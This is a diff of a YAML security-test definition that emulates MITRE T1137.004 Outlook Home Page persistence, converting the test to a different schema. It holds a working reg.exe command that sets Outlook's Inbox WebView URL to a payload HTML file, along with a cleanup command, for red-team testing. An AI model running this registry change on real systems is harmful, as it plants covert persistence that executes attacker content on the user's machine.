@@ -1,19 +1,20 @@
-- id: 74da6cc3-ffec-5fa5-9569-f66446f72b60
+- requirements: []
   name: Soumaia ART Tests - Install Outlook Home Page Persistence
   description: 'This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.
 
 
     Triggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).'
   tactic: persistence
-  technique:
-    attack_id: T1137.004
-    name: 'Office Application Startup: Outlook Home Page'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          reg.exe add HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /t REG_SZ /d file://.\T1137.004.html /f
-        cleanup: |-
-          reg.exe delete HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /f >nul 2>&1
-        payloads:
-        - T1137.004.html
+  technique_id: T1137.004
+  technique_name: 'Office Application Startup: Outlook Home Page'
+  executors:
+  - cleanup:
+    - reg.exe delete HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /f >nul 2>&1
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads:
+    - T1137.004.html
+    parsers: []
+    command: reg.exe add HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /t REG_SZ /d file://.\T1137.004.html /f
+  id: 74da6cc3-ffec-5fa5-9569-f66446f72b60
